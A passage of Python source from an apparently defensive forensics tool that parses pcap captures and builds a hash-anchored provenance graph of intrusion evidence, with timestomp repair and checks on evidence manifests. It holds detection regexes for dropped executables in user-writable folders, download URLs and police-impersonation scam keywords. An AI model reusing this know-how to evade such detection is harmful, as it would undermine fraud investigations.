        if len(gh) < 24 or gh[:4] not in PCAP_MAGIC:
            raise ValueError("not a classic pcap file")
        endian, ns_mul = PCAP_MAGIC[gh[:4]]
        linktype = struct.unpack(endian + "I", gh[20:24])[0]
        off = 24
        while True:
            rh = f.read(16)
            if len(rh) < 16:
                return
            ts_s, ts_frac, incl, _orig = struct.unpack(endian + "IIII", rh)
            data = f.read(incl)
            if len(data) < incl:
                return
            rec_off, rec_len = off, 16 + incl
            off += rec_len
            p = 0
            if linktype == 1:
                if len(data) < 14:
                    continue
                etype = struct.unpack_from(">H", data, 12)[0]
                p = 14
                if etype == 0x8100 and len(data) >= 18:
                    etype, p = struct.unpack_from(">H", data, 16)[0], 18
            elif linktype in (101, 228, 229):
                etype = 0x0800 if data and data[0] >> 4 == 4 else 0x86DD
            else:
                continue
            if etype == 0x0800 and len(data) >= p + 20:
                ihl = (data[p] & 0x0F) * 4
                proto = data[p + 9]
                src, dst = str(ipaddress.IPv4Address(data[p + 12:p + 16])), str(ipaddress.IPv4Address(data[p + 16:p + 20]))
                t = p + ihl
            elif etype == 0x86DD and len(data) >= p + 40:
                proto = data[p + 6]
                src, dst = str(ipaddress.IPv6Address(data[p + 8:p + 24])), str(ipaddress.IPv6Address(data[p + 24:p + 40]))
                t = p + 40
            else:
                continue
            if proto != 6 or len(data) < t + 14:
                continue
            sport, dport = struct.unpack_from(">HH", data, t)
            flags = data[t + 13]
            if flags & 0x02 and not flags & 0x10:
                yield {"byte_offset": rec_off, "length": rec_len, "timestamp_ns": ts_s * NS + ts_frac * ns_mul,
                       "src_ip": src, "src_port": sport, "dst_ip": dst, "dst_port": dport}


def build_pcap(packets: Sequence[Tuple[int, str, int, str, int, int]]) -> bytes:
    """packets: (ts_ns, src_ip, sport, dst_ip, dport, tcp_flags) -> microsecond libpcap, Ethernet/IPv4/TCP."""
    out = bytearray(struct.pack("<IHHiIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 1))
    for ts, sip, sp, dip, dp, fl in packets:
        tcp = struct.pack(">HHIIBBHHH", sp, dp, 1000, 0, 5 << 4, fl, 64240, 0, 0)
        ip = struct.pack(">BBHHHBBH4s4s", 0x45, 0, 20 + len(tcp), 1, 0, 64, 6, 0,
                         ipaddress.IPv4Address(sip).packed, ipaddress.IPv4Address(dip).packed)
        frame = b"\x00\x11\x22\x33\x44\x55" + b"\x66\x77\x88\x99\xaa\xbb" + b"\x08\x00" + ip + tcp
        sec, rem = divmod(ts, NS)
        out += struct.pack("<IIII", sec, rem // 1000, len(frame), len(frame)) + frame
    return bytes(out)


_FULL_URL_RX = re.compile(r"(?i)\b(?:https?|ftp)://\[?([0-9a-z.\-:]+?)\]?(?::(\d{1,5}))?(/[^\s'\";|]*)?(?=['\"\s);|]|$)")
_URL_RX = re.compile(r"(?i)\b(?:https?|ftp)://\[?([0-9a-z.\-:]+?)\]?(?::(\d{1,5}))?(?=[/'\"\s)]|$)")
_WIN_PATH_RX = re.compile(r"(?i)\b([a-z]:\\[^'\"<>|\r\n]*?\.(?:exe|dll|ps1|bat|vbs|scr|js|hta|apk|zip))\b")
_IMPERSONATION_RX = re.compile(r"(?i)\b(cbi|police|crime\s*branch|customs|narcotics|ncb|\bed\b|enforcement|"
                               r"trai|rbi|court|judge|income\s*tax|cyber\s*cell)\b")
_USER_WRITABLE_RX = re.compile(r"(?i)\\(users\\public|appdata|temp|downloads|programdata)\\")


def _is_public_ip(ip: str) -> bool:
    try:
        return ipaddress.ip_address(ip).is_global
    except ValueError:
        return False


# --------------------------------------------------------------------------- #
# 3.  The temporal provenance knowledge graph                                 #
# --------------------------------------------------------------------------- #

STORYLINE_STEP_FIELDS = ("step", "stage", "stage_name", "timestamp_utc", "timestamp_basis", "actor", "action",
                         "target", "relation", "narrative", "edge_uid", "provenance")
SECTION63_FIELDS = ("source_file", "byte_offset", "length", "sha256", "hash_algorithm", "source_type",
                    "offset_basis")


class TemporalProvenanceGraph:
    """
    The T-PKG. Every edge is a 32-byte arena record plus a 48-byte ledger anchor; optional
    metadata (lead id, secondary anchors, repair notes) is kept only for annotated edges and
    leaves with the edge when the ring evicts it.

    Anchors are re-hashed from the evidence by default (verify_anchors=True): an anchor whose
    file cannot be found on this workstation is refused (UNVERIFIABLE_SOURCE_FILE), secondary
    anchors included. Turning verification off is recorded in both output files, makes the
    Section 63 validator fail, and leaves defence challenge D1 OPEN.
    """

    PENDING_CAP = 65_536

    def __init__(self, case_id: str = "FIR-042/2026-CYBER", capacity: int = 1_000_000,
                 ledger_path: Optional[str] = None, gamma: float = 1.5, output_dir: Optional[str] = None,
                 evidence_root: Optional[str] = None, verify_anchors: bool = True,
                 local_tz_minutes: int = 330, artifact_paths: Optional[Dict[str, str]] = None,
                 audit_key: Optional[bytes] = None):
        self.case_id = case_id
        self.output_dir = output_dir or os.getcwd()
        self.arena = CSRGraphArena(capacity)
        self.arena.on_evict = self._on_evict
        self.ledger = ProvenanceLedger(capacity, ledger_path)
        self.entities = GraphEntityTable()
        self.entities.on_release = self._on_release
        self.supernode = AntiSupernodeEngine(self.entities, gamma)
        self.timestomp = AntiTimestompEngine()
        self.encoder = BijectiveTimeEncoder(d=4)
        env_key = os.environ.get("SUTRA_AUDIT_KEY")
        self.audit = AuditLedger(key=audit_key if audit_key is not None else (env_key.encode() if env_key else None))
        self.local_tz = datetime.timezone(datetime.timedelta(minutes=local_tz_minutes))
        self.evidence_root = evidence_root
        self.verify_anchors = verify_anchors
        self.artifact_paths = dict(artifact_paths or {})
        self.edge_meta: Dict[int, Dict[str, Any]] = {}
        self.node_prize: Dict[int, int] = {}
        self.created_ts: Dict[int, int] = {}          # process node -> earliest SPAWNED-in timestamp
        self.rejected: List[Dict[str, Any]] = []
        self.rejected_count: Counter = Counter()
        self.anchor_stats: Counter = Counter()
        self.sector_a: Optional[Dict[str, Any]] = None
        self.sector_b: Optional[Dict[str, Any]] = None
        self.bad_sectors: List[int] = []
        self.sector_size = 4096
        self.vault_files: Set[str] = set()
        self.timestomp_report: Dict[str, Any] = {"findings": [], "per_record": {}, "journal_append_only_ok": None,
                                                 "quarantined_records": []}
        self.causality_report: Optional[Dict[str, Any]] = None
        self.lead_edges: Dict[str, List[int]] = {}
        self.leads_rejected: List[Dict[str, Any]] = []
        self.exculpatory_checklist: Optional[Dict[str, Any]] = None
        self._iocs: Set[str] = set()
        self._pending_net: "OrderedDict[Tuple[str, int, str, int], Dict[str, Any]]" = OrderedDict()
        self._pending_files: "OrderedDict[str, Dict[str, Any]]" = OrderedDict()
        self.unconfirmed_intents = 0
        self.source_paths: Dict[str, str] = {}
        self._bindings_seen: Set[Tuple[str, str, int]] = set()
        self._log_engine = _sector_b.LogTriageEngine() if _sector_b is not None else None
        self._hash_cache: "OrderedDict[Tuple[str, int, int], Optional[str]]" = OrderedDict()

    # ----- anchors --------------------------------------------------------- #

    def _resolve_source(self, source_file: str) -> Optional[str]:
        if not source_file:
            return None
        if source_file in self.source_paths:
            return self.source_paths[source_file]
        if source_file.startswith("artifact:"):
            p = self.artifact_paths.get(source_file[len("artifact:"):])
            return p if p and os.path.isfile(p) else None
        if os.path.isabs(source_file) and os.path.isfile(source_file):
            return source_file
        if self.evidence_root:
            p = os.path.join(self.evidence_root, source_file)
            if os.path.isfile(p):
                return p
        return source_file if os.path.isfile(source_file) else None

    def _rehash(self, path: str, off: int, length: int, fresh: bool = False) -> Optional[str]:
        key = (path, off, length)
        if key in self._hash_cache and not fresh:
            return self._hash_cache[key]
        h, got = hashlib.sha256(), 0
        with open(path, "rb") as f:
            f.seek(off)
            while got < length:
                chunk = f.read(min(4 * 1024 * 1024, length - got))
                if not chunk:
                    break
                h.update(chunk)
                got += len(chunk)
        digest = h.hexdigest() if got == length else None
        self._hash_cache[key] = digest
        if len(self._hash_cache) > 65_536:
            self._hash_cache.popitem(last=False)
        return digest

    def _overlaps_bad_sector(self, off: int, length: int) -> Optional[int]:
        if not self.bad_sectors:
            return None
        first, last = off // self.sector_size, (off + length - 1) // self.sector_size
        i = bisect.bisect_left(self.bad_sectors, first)
        if i < len(self.bad_sectors) and self.bad_sectors[i] <= last:
            return self.bad_sectors[i]
        return None

    def _in_vault_image(self, source_file: str, offset_basis: str) -> bool:
        """True when offsets of this anchor are offsets in the Sector A acquisition (bad-sector mask applies)."""
        return os.path.basename(source_file) in self.vault_files or (
            offset_basis == "ABSOLUTE_IN_FILE" and bool(self.vault_files))

    def normalize_anchor(self, anchor: Optional[Dict[str, Any]]) -> Dict[str, Any]:
        """Validate (and by default re-hash) an anchor. Raises ProvenanceError with a reason code."""
        if not isinstance(anchor, dict):
            raise ProvenanceError("MISSING_ANCHOR")
        src = anchor.get("source_file") or anchor.get("file_path")
        if not src and anchor.get("artifact_id"):
            src = f"artifact:{anchor['artifact_id']}"
        off, length, sha = anchor.get("byte_offset"), anchor.get("length"), anchor.get("sha256")
        if not src:
            raise ProvenanceError("MISSING_SOURCE_FILE")
        if not isinstance(off, int) or isinstance(off, bool) or off < 0:
            raise ProvenanceError("MISSING_BYTE_OFFSET")
        if not isinstance(length, int) or isinstance(length, bool) or length <= 0:
            raise ProvenanceError("MISSING_LENGTH")
        if not isinstance(sha, str) or not re.fullmatch(r"[0-9a-f]{64}", sha):
            raise ProvenanceError("MISSING_SHA256")
        basis = anchor.get("offset_basis", "FILE")
        out = {"source_file": src, "byte_offset": off, "length": length, "sha256": sha,
               "source_type": anchor.get("source_type", ""), "offset_basis": basis}
        if self._in_vault_image(src, basis):
            bad = self._overlaps_bad_sector(off, length)
            if bad is not None:
                raise ProvenanceError(f"ANCHOR_IN_BAD_SECTOR:{bad}")
        if self.verify_anchors:
            path = self._resolve_source(src)
            if path is None:
                raise ProvenanceError("UNVERIFIABLE_SOURCE_FILE")
            if self._rehash(path, off, length) != sha:
                raise ProvenanceError("ANCHOR_HASH_MISMATCH")
            self.anchor_stats["verified"] += 1
        else:
            self.anchor_stats["not_verified"] += 1
        return out

    def make_anchor(self, path: str, off: int, length: int, source_type: str, display: Optional[str] = None
                    ) -> Dict[str, Any]:
        """Build an anchor by hashing exactly [off, off+length) of the file on disk."""
        digest = self._rehash(path, off, length)
        self.source_paths[display or os.path.basename(path)] = os.path.abspath(path)
        if digest is None:
            raise ProvenanceError("SHORT_READ")
        return {"source_file": display or os.path.basename(path), "byte_offset": off, "length": length,
                "sha256": digest, "source_type": source_type, "offset_basis": "FILE"}

    def _reject(self, reason: str, detail: Dict[str, Any]) -> None:
        code = reason.split(":")[0]
        self.rejected_count[code] += 1
        if len(self.rejected) < 1000:
            self.rejected.append(dict(detail, reason=reason))

    # ----- edges ----------------------------------------------------------- #

    def add_edge(self, src: Tuple[str, str], dst: Tuple[str, str], rel: int, ts_ns: int,
                 anchor: Optional[Dict[str, Any]], score: float = 0.0, flags: int = 0,
                 meta: Optional[Dict[str, Any]] = None,
                 secondary_anchors: Optional[Dict[str, Dict[str, Any]]] = None) -> int:
        """
        Insert one edge. Raises ProvenanceError (and records the rejection) when the primary or any
        secondary anchor is incomplete, falls in a bad sector, cannot be found, or does not re-hash.
        """
        try:
            a = self.normalize_anchor(anchor)
            sec = {k: self.normalize_anchor(v) for k, v in (secondary_anchors or {}).items()}
        except ProvenanceError as exc:
            self._reject(str(exc), {"src": list(src), "dst": list(dst), "relation": RELATION_NAMES.get(rel, rel),
                                    "anchor": anchor if isinstance(anchor, dict) else None})
            raise
        if rel not in RELATION_NAMES:
            raise ValueError(f"unknown relation {rel}")
        ts_ns = int(ts_ns or 0)
        if ts_ns < 0 or ts_ns > CSRGraphArena.MAX_TS:
            raise ValueError("timestamp out of range")
        loss = score_to_q16(score)
        if score is not None and score >= 0.5:
            flags |= FLAG_SUSPICIOUS
        if ts_ns == 0:
            flags |= FLAG_TIME_UNKNOWN
        if sec:
            flags |= FLAG_MULTI_ANCHOR

        sk, sn = src
        dk, dn = dst
        src_id = self.supernode.resolve(sk, sn, ts_ns)
        untrusted = (not self.supernode.is_broker(sk, sn) or self.entities.epochs[src_id] > 1
                     or (score or 0.0) >= 0.8)
        if rel in TAINT_RELATIONS and self.supernode.is_broker(dk, dn) and untrusted and ts_ns > 0 and sn != dn:
            old, new, created = self.supernode.split(dn, ts_ns)
            if created:
                self._append(old, new, REL_EPOCH_TRANSITION, FLAG_TAINTED_EPOCH | FLAG_SUSPICIOUS, ts_ns, a, loss,
                             {"epoch_split": {"broker": dn, "tainted_by": self.entities.label(src_id),
                                              "from": self.entities.label(old), "to": self.entities.label(new)}}, {})
                self._rebind(old, new, ts_ns)
            dst_id = new
            flags |= FLAG_TAINTED_EPOCH
        else:
            dst_id = self.supernode.resolve(dk, dn, ts_ns)
            if self.entities.epochs[src_id] > 1 or self.entities.epochs[dst_id] > 1:
                flags |= FLAG_TAINTED_EPOCH
        return self._append(src_id, dst_id, rel, flags, ts_ns, a, loss, meta, sec)

    def _append(self, src_id: int, dst_id: int, rel: int, flags: int, ts_ns: int, a: Dict[str, Any], loss: int,
                meta: Optional[Dict[str, Any]], sec: Dict[str, Dict[str, Any]]) -> int:
        # pin both ends while the ring may evict, so an id is never released and reused mid-insert
        self.entities.incref(src_id)
        self.entities.incref(dst_id)
        seq = self.arena.append(src_id, dst_id, rel, flags, ts_ns, a["byte_offset"], loss)
        six = self.ledger.intern_source(a["source_file"], a["source_type"], a["offset_basis"])
        self.ledger.put(seq, six, a["byte_offset"], a["length"], a["sha256"])
        self.supernode.degree[(src_id, rel)] += 1
        if rel == REL_SPAWNED and ts_ns:
            cur = self.created_ts.get(dst_id)
            if cur is None or ts_ns < cur:
                self.created_ts[dst_id] = ts_ns
        if meta or sec:
            m = dict(meta or {})
            if sec:
                m["secondary_anchors"] = sec
            self.edge_meta[seq] = m
        return seq

    def _rebind(self, old: int, new: int, t_split: int) -> int:
        """After a (possibly late-arriving) taint, move the broker's edges at/after t_split to the new epoch."""
        moved = 0
        for seq in self.arena.live_seqs():
            s, d, rel, fl, ts, off, loss = self.arena.record(seq)
            if rel == REL_EPOCH_TRANSITION or ts < t_split:
                continue
            if s == old:
                self._degree_add(old, rel, -1)
                self.supernode.degree[(new, rel)] += 1
                self.entities.incref(new)
                self.arena.update(seq, src=new, flags=fl | FLAG_TAINTED_EPOCH)
                self.entities.decref(old)
                moved += 1
            elif d == old:
                self.entities.incref(new)
                self.arena.update(seq, dst=new, flags=fl | FLAG_TAINTED_EPOCH)
                self.entities.decref(old)
                if rel == REL_SPAWNED:
                    self.created_ts[new] = min(self.created_ts.get(new, ts), ts)
                moved += 1
        return moved

    def _degree_add(self, src: int, rel: int, delta: int) -> None:
        k = (src, rel)
        v = self.supernode.degree[k] + delta
        if v:
            self.supernode.degree[k] = v
        else:
            del self.supernode.degree[k]

    def _on_evict(self, seq: int, rec: Tuple[int, ...]) -> None:
        self._degree_add(rec[0], rec[2], -1)
        self.edge_meta.pop(seq, None)
        self.entities.decref(rec[0])
        self.entities.decref(rec[1])

    def _on_release(self, ix: int) -> None:
        self.created_ts.pop(ix, None)
        self.node_prize.pop(ix, None)

    def edge(self, seq: int) -> Dict[str, Any]:
        s, d, rel, fl, ts, off, loss = self.arena.get(seq)
        prov = self.ledger.get(seq)
        meta = self.edge_meta.get(seq, {})
        return {"seq": seq, "src": s, "dst": d, "rel": rel, "flags": fl, "ts": ts, "omega": off, "loss": loss,
                "provenance": prov, "meta": meta}

    def edge_uid(self, e: Dict[str, Any]) -> str:
        p = e["provenance"]
        body = [p["source_file"], p["byte_offset"], p["length"], p["sha256"], e["rel"],
                list(self.entities.key(e["src"])), list(self.entities.key(e["dst"]))]
        return "E-" + _sha256_hex(canonical_json(body))[:20]

    def set_prize(self, kind: str, name: str, score: float) -> None:
        """Explicit node prize (Q16); prized nodes are pinned in the entity table."""
        if self.supernode.is_broker(kind, name):
            self.supernode.resolve(kind, name, 0)
            ids = [i for _, i in self.supernode.splits[name]]
        else:
            ids = [self.entities.intern(kind, name, 0)]
        for ix in ids:
            self.entities.pinned.add(ix)
            self.node_prize[ix] = max(self.node_prize.get(ix, 0), score_to_q16(score))

    # ----- Invariant 5: causality ----------------------------------------- #

    def _downstream_bound(self, seq: int, s: int, d: int, rel: int, row_ptr, seqs,
                          untrusted: Set[int] = frozenset()) -> Optional[int]:
        """Earliest later use of the edge's target: its own out-edges, or (for a file) the parent spawning it."""
        best = None
        for k in range(row_ptr[d], row_ptr[d + 1]):
            r = self.arena.record(seqs[k])
            if r[4] and not r[3] & FLAG_TIME_REPAIRED and seqs[k] not in untrusted:
                best = r[4] if best is None else min(best, r[4])
        if rel == REL_WROTE_FILE:
            img = _basename(self.entities.names[d])
            for k in range(row_ptr[s], row_ptr[s + 1]):
                r = self.arena.record(seqs[k])
                if r[2] == REL_SPAWNED and r[4] and seqs[k] not in untrusted and self.supernode.image_of(self.entities.names[r[1]] or "") == img:
                    best = r[4] if best is None else min(best, r[4])
        return best

    def check_causality(self, tolerance_ns: int = NS, repair: bool = True) -> Dict[str, Any]:
        """
        t(child action) >= t(parent process creation) for every process action edge. A violation is a
        TEMPORAL_PARADOX_INVERSION. Repair gives an interval, never a guess:
          lower bound = the parent's creation time, raised to the parent's first connection to the
                        host the payload was fetched from, *only* when the edge records that the file
                        was downloaded from that host (command-line URL) and that connection is not
                        after the upper bound;
          upper bound = the earliest later use of the target (its own actions, or the parent
                        spawning a process from that file), when one is known.
        The edge is placed at the lower bound and flagged TIME_REPAIRED; the recorded value stays in
        the edge (recorded_timestamp_ns) and in the hash-chained audit ledger. Edges whose time
        came from the kernel ($UsnJrnl FILE_CREATE, $FN) are rarely inverted; this rule exists for
        the records where every timestamp was rewritten.
        """
        n = len(self.entities)
        row_ptr, seqs = self.arena.build_csr(n)
        paradoxes, repaired = [], 0
        # Pass 1: find every inverted edge on the recorded times. Pass 2 computes each repair from
        # that same snapshot (inverted edges are never used as bounds), in byte-offset order, so the
        # result and the audit chain do not depend on the order evidence was ingested.
        viol = []
        for seq in self.arena.live_seqs():
            s, d, rel, fl, ts, off, loss = self.arena.record(seq)
            if rel not in PROCESS_ACTION_RELATIONS or self.entities.kinds[s] != "PROCESS" or not ts:
                continue
            born = self.created_ts.get(s)
            if born is None or ts >= born - tolerance_ns or fl & FLAG_TIME_REPAIRED:
                continue
            p = self.ledger.get(seq)
            viol.append(((off, p["source_file"], p["length"], p["sha256"], rel, self.entities.key(s),
                          self.entities.key(d)), seq))
        viol.sort()
        untrusted = {q for _k, q in viol}
        plans = []
        for _k, seq in viol:
            s, d, rel, fl, ts, off, loss = self.arena.record(seq)
            born = self.created_ts[s]
            rec = {"rule": "TEMPORAL_PARADOX_INVERSION", "edge_uid": self.edge_uid(self.edge(seq)),
                   "parent": self.entities.label(s), "child": self.entities.label(d),
                   "relation": RELATION_NAMES[rel], "recorded_utc": ns_to_iso(ts), "parent_created_utc": ns_to_iso(born)}
            if repair:
                meta = self.edge_meta.setdefault(seq, {})
                upper = self._downstream_bound(seq, s, d, rel, row_ptr, seqs, untrusted)
                hosts = set(meta.get("payload_source_hosts") or [])
                basis, basis_seq, new_ts, rejected_sock = "PARENT_PROCESS_CREATION", None, born, None
                if hosts:
                    socks = []
                    for k in range(row_ptr[s], row_ptr[s + 1]):
                        q = seqs[k]
                        _, d2, r2, f2, t2, o2, _ = self.arena.record(q)
                        name = self.entities.names[d2] or ""
                        if (r2 == REL_CONNECTED_TO and t2 >= born and q not in untrusted
                                and name.rsplit(":", 1)[0] in hosts):
                            socks.append((t2, o2, q))
                    if socks:
                        t_sock, _, q = min(socks)
                        if upper is None or t_sock <= upper:
                            new_ts, basis_seq, basis = t_sock, q, "PARENT_DOWNLOAD_CONNECTION"
                        else:
                            rejected_sock = ns_to_iso(t_sock)
                plans.append((seq, new_ts, fl))
                basis_anchor = self.ledger.get(basis_seq) if basis_seq is not None else None
                note = {"recorded_utc": ns_to_iso(ts), "recorded_ns": ts, "repaired_utc": ns_to_iso(new_ts),
                        "repaired_ns": new_ts, "upper_bound_utc": ns_to_iso(upper) if upper else None,
                        "basis": basis, "semantics": "LOWER_BOUND (not earlier than)", "basis_anchor": basis_anchor}
                if upper is not None and new_ts > upper:
                    note["bounds_conflict"] = "lower bound is after the earliest downstream use; examiner to explain"
                if rejected_sock:
                    note["socket_not_used"] = f"connection at {rejected_sock} is after the upper bound"
                meta["timestamp_repair"] = note
                meta["recorded_timestamp_ns"] = ts
                self.audit.append(dict(rec, action="TIMESTAMP_REPAIRED",
                                       **{k: v for k, v in note.items() if k != "basis_anchor"},
                                       basis_anchor_sha256=basis_anchor["sha256"] if basis_anchor else None))
                rec.update(repaired_utc=ns_to_iso(new_ts), basis=basis)
                repaired += 1
            paradoxes.append(rec)
        for seq, new_ts, fl in plans:
            self.arena.update(seq, ts=new_ts, flags=fl | FLAG_TIMESTOMP_INVERTED | FLAG_TIME_REPAIRED)
        unresolved = sum(1 for p in paradoxes if "repaired_utc" not in p)
        prior = self.causality_report or {"paradoxes": [], "repaired": 0}
        report = {"checked_edges": self.arena.count, "paradoxes_detected": len(prior["paradoxes"]) + len(paradoxes),
                  "paradoxes": prior["paradoxes"] + paradoxes, "repaired": prior["repaired"] + repaired,
                  "unresolved": unresolved}
        self.causality_report = report
        return report

    # ----- Sector A / Sector B inputs --------------------------------------- #

    def ingest_evidence_manifest(self, manifest: Any) -> Dict[str, Any]:
        """Bind to Sector A: verify the manifest's canonical digest, load the bad-sector mask, root the audit chain."""
        if isinstance(manifest, str):
            with open(manifest, "r", encoding="utf-8") as f:
                manifest = json.load(f)
        if manifest.get("case_reference") and manifest["case_reference"] != self.case_id:
            raise ValueError(f"evidence manifest is for {manifest['case_reference']}, not {self.case_id}")
        digest_status = "UNVERIFIED (sector_a_vault.py not found beside this file)"
        canon = getattr(_sector_a, "_canonical_json", None)
        if canon is not None:
            body = {k: v for k, v in manifest.items() if k != "manifest_canonical_sha256"}
            if hashlib.sha256(canon(body)).hexdigest() != manifest.get("manifest_canonical_sha256"):
                raise ValueError("evidence_manifest.json canonical digest mismatch (manifest altered)")
            digest_status = "VERIFIED"
        bsm = manifest.get("bad_sector_manifest") or {}
        self.sector_size = int(bsm.get("sector_size_bytes", 4096))
        self.bad_sectors = sorted(set(int(b) for b in bsm.get("bad_sectors", [])))
        media = manifest.get("evidence_media", {})
        for k in ("filename", "acquired_image"):
            if media.get(k):
                self.vault_files.add(os.path.basename(media[k]))
        h = manifest.get("cryptographic_hashes", {})
        if h.get("master_case_root_v3"):
            self.audit.rebase(h["master_case_root_v3"])
        self.sector_a = {"vault_version": manifest.get("version"), "evidence_id": manifest.get("evidence_id"),
                         "case_reference": manifest.get("case_reference"),
                         "evidence_filename": media.get("filename"), "evidence_size_bytes": media.get("size_bytes"),
                         "sha256_linear_primary": h.get("sha256_linear_primary"),
                         "master_case_root_v3": h.get("master_case_root_v3"),
                         "manifest_canonical_sha256": manifest.get("manifest_canonical_sha256"),
                         "manifest_digest": digest_status,
                         "admissibility_status": (manifest.get("admissibility") or {}).get("status"),
                         "bad_sectors": list(self.bad_sectors), "sector_size_bytes": self.sector_size}
        return self.sector_a

    def ingest_triage_manifest(self, manifest: Any, evidence_root: Optional[str] = None,
                               verify_anchors: Optional[bool] = None) -> Dict[str, Any]:
        """
        Convert every Sector B lead (symbolic anchor P_sym) into graph edges. Leads whose anchor fails
        the provenance rule are listed in leads_rejected, never silently dropped.
        """
        if isinstance(manifest, str):
            if evidence_root is None:
                evidence_root = os.path.dirname(os.path.abspath(manifest))
            with open(manifest, "r", encoding="utf-8") as f:
                manifest = json.load(f)
        if evidence_root:
            self.evidence_root = evidence_root
        if verify_anchors is not None:
            self.verify_anchors = verify_anchors
        validate = getattr(_sector_b, "validate_manifest", None)
        schema = "UNVERIFIED (sector_b_triage.py not found beside this file)"
        if validate is not None:
            problems = validate(manifest)
            if problems:
                raise ValueError(f"triage_manifest.json failed validation: {problems[:5]}")
            schema = "VERIFIED"
        if manifest.get("case_id") and manifest["case_id"] != self.case_id:
            raise ValueError(f"triage manifest is for {manifest['case_id']}, not {self.case_id}")
        b_bind = manifest.get("sector_a_binding") or {}
        if self.sector_a and b_bind.get("sha256_linear_primary") and \
                b_bind["sha256_linear_primary"] != self.sector_a["sha256_linear_primary"]:
            raise ValueError("triage manifest is bound to a different Sector A acquisition")
        self.sector_b = {"triage_version": manifest.get("version"), "case_id": manifest.get("case_id"),
                         "triage_timestamp_utc": manifest.get("triage_timestamp_utc"),
                         "manifest_sha256": manifest.get("manifest_sha256"), "schema": schema,
                         "leads": len(manifest.get("symbolic_anchors", []))}
        self.exculpatory_checklist = manifest.get("section45_exculpatory_checklist")
        leads = manifest.get("symbolic_anchors", [])
        session_ts: Dict[str, int] = {}
        for l in leads:
            cand = (l.get("lead_details") or {}).get("candidate") or {}
            sid = cand.get("call_id") or (l.get("symbolic_anchor") or {}).get("session_id")
            t = self._ts(cand.get("timestamp_utc"))
            if sid and t and (sid not in session_ts or t < session_ts[sid]):
                session_ts[sid] = t
        added = 0
        for l in leads:
            lid = l.get("lead_id", "?")
            try:
                seqs = self._lead_to_edges(l, session_ts)
            except ProvenanceError as exc:
                self.leads_rejected.append({"lead_id": lid, "reason": str(exc)})
                self.audit.append({"action": "LEAD_REJECTED", "lead_id": lid, "reason": str(exc)})
                continue
            self.lead_edges[lid] = seqs
            added += len(seqs)
        return {"leads": len(leads), "leads_converted": len(self.lead_edges), "edges_added": added,
                "leads_rejected": list(self.leads_rejected)}

    def ingest_case_bindings(self, path: str) -> Dict[str, Any]:
        """
        Attribution links the examiner can show in a document (bank KYC reply, telecom CDR reply,
        seizure memo): a JSON list of {"src": [kind, name], "dst": [kind, name], "relation": "OWNS" |
        "LOGGED_IN_AS" | "OBSERVED_ON" | "RESOLVES_TO", "document": file, "quote": exact text}.
        The quote must occur exactly once in the document; its byte range becomes the anchor, so a
        binding goes through the same provenance rule as any other edge. Nothing is inferred.
        """
        with open(path, "r", encoding="utf-8") as f:
            items = json.load(f)
        base = os.path.dirname(os.path.abspath(path))
        added, refused = 0, []
        for i, b in enumerate(items):
            try:
                rel = RELATION_BY_NAME[b["relation"]]
                if rel not in BINDING_RELATIONS:
                    raise ValueError(f"{b['relation']} is not an attribution relation")
                doc = b["document"]
                dpath = doc if os.path.isabs(doc) else (self._resolve_source(doc) or os.path.join(base, doc))
                with open(dpath, "rb") as f:
                    data = f.read()
                q = b["quote"].encode("utf-8")
                at = data.find(q)
                if at < 0 or data.find(q, at + 1) >= 0:
                    raise ValueError("quote must occur exactly once in the document")
                anchor = self.make_anchor(dpath, at, len(q), b.get("source_type", "CASE_DOCUMENT"), doc)
                self.add_edge(tuple(b["src"]), tuple(b["dst"]), rel, self._ts(b.get("timestamp_utc")), anchor, 0.0,
                              meta={"binding_basis": "CASE_DOCUMENT", "document": doc})
                added += 1
            except (KeyError, ValueError, OSError, ProvenanceError) as exc:
                refused.append({"index": i, "reason": str(exc)})
                self.audit.append({"action": "BINDING_REFUSED", "index": i, "reason": str(exc)})
        return {"bindings_added": added, "bindings_refused": refused}

    def _ts(self, value: Any, local: bool = False) -> int:
        try:
            return iso_to_ns(value, self.local_tz if local else datetime.timezone.utc)
        except ValueError:
            return 0

    def _endpoint_link(self, ent: Tuple[str, str], ip: Optional[str], ts: int, anchor: Dict[str, Any],
                       out: Optional[List[int]] = None) -> None:
        """Join records that name the same IP address through one HOST node (exact identifier match)."""
        if not ip:
            return
        try:
            ipaddress.ip_address(ip)
        except ValueError:
            return
        key = (ent[1], ip, REL_RESOLVES_TO)
        if key in self._bindings_seen:
            return
        self._bindings_seen.add(key)
        seq = self.add_edge(ent, ("HOST", ip), REL_RESOLVES_TO, ts, anchor, 0.0,
                            meta={"binding_basis": "SAME_IP_ADDRESS",
                                  "caveat": "an IP behind CGNAT can be shared by different subscribers"})
        if out is not None:
            out.append(seq)

    def _lead_to_edges(self, lead: Dict[str, Any], session_ts: Dict[str, int]) -> List[int]:
        cat = lead.get("threat_category", "UNKNOWN")
        d = lead.get("lead_details") or {}
        a = lead.get("symbolic_anchor")
        score = float(lead.get("threat_score") or 0.0)
        lid = lead.get("lead_id")
        meta = {"lead_id": lid, "threat_category": cat, "mitre": lead.get("mitre_technique")}
        st = (a or {}).get("source_type", "")
        device = ("DEVICE", "android-handset" if st.startswith("ANDROID") else "windows-endpoint")
        out: List[int] = []

        def add(src, dst, rel, ts, anchor=a, sc=score, fl=0, sec=None, m=None):
            seq = self.add_edge(src, dst, rel, ts, anchor, sc, fl, dict(meta, **(m or {})), sec)
            out.append(seq)
            for ent in (src, dst):
                if sc >= 0.5 and rel not in BINDING_RELATIONS:
                    self.set_prize(ent[0], ent[1], sc)
            return seq

        def observed_on(ent, ts):
            key = (ent[1], device[1], REL_OBSERVED_ON)
            if key not in self._bindings_seen:
                self._bindings_seen.add(key)
                add(ent, device, REL_OBSERVED_ON, ts, sc=0.0, m={"binding_basis": "RECORD_FROM_THIS_DEVICE"})

        if cat == "LOLBINS_COMMAND":
            parent = _basename(d.get("parent_image")) or "unknown-parent"
            image = _basename(d.get("image")) or "unknown-image"
            ts = self._ts(d.get("timestamp_utc"))
            add(("PROCESS", parent), ("PROCESS", image), REL_SPAWNED, ts)
            observed_on(("PROCESS", parent), ts)
            text = "\n".join(x.get("text", "") for x in d.get("deobfuscation_layers", []))
            for host, port in sorted(set(_URL_RX.findall(text))):
                sock = ("SOCKET", f"{host}:{port or 80}")
                self._iocs.add(host)
                add(("PROCESS", image), sock, REL_CONNECTED_TO, ts, m={"inferred_from": "command line URL"})
                self._endpoint_link(sock, host, ts, a, out)
        elif cat == "REMOTE_ACCESS_SESSION":
            add(("IDENTITY", f"anydesk:{d.get('remote_client_id', '?')}"), device, REL_REMOTE_SESSION,
